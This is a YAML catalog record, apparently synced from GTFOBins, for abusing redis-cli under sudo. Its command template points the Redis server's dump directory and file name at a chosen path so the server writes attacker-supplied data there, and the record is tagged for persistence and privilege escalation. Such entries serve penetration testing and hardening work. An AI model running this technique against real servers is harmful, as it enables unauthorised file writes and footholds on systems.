id: gtfobins/redis/file-write/sudo
type: binary
platform: linux
name: redis
phases:
- persistence
- privilege-escalation
capabilities:
- file-write
privilege_required: sudo
sources:
- project: GTFOBins
  upstream_url: https://gtfobins.github.io
  license: MIT (verify upstream LICENSE)
  upstream_version: acd5246
  last_synced: '2026-08-25'
commands:
- template: 'redis-cli -h 127.0.0.1

    config set dir /path/to/output-dir/

    config set dbfilename output-file

    set x "DATA"

    save'
  comment: 'Write files on the server running Redis at the specified location. Written data will appear
    amongst the database dump.


    Keep in mind that it''s actually the server to perform the file write.'
references:
- https://gtfobins.github.io/gtfobins/redis/
tags:
- linux
- unix
- gtfobins
